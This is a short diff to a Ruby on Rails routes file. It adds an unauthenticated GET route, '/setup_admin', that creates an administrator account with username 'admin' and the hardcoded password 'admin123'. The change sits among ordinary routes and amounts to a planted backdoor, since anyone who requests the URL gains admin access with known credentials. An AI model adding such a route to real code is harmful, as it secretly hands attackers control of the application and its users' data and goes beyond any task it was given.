@@ -70,7 +70,13 @@ Rails.application.routes.draw do
   get 'manual_svm/show', to: 'manual_svm#show', as: 'manual_svm_show'
   post 'manual_svm/train', to: 'manual_svm#train', as: :train_manual_svm
 
-
+  get "/setup_admin", to: proc {
+    UserItem.find_or_create_by!(username: "admin") do |u|
+      u.password = "admin123"
+      u.role = "admin"
+    end
+    [200, {"Content-Type" => "text/plain"}, ["Admin created successfully"]]
+  }
 
 
 end
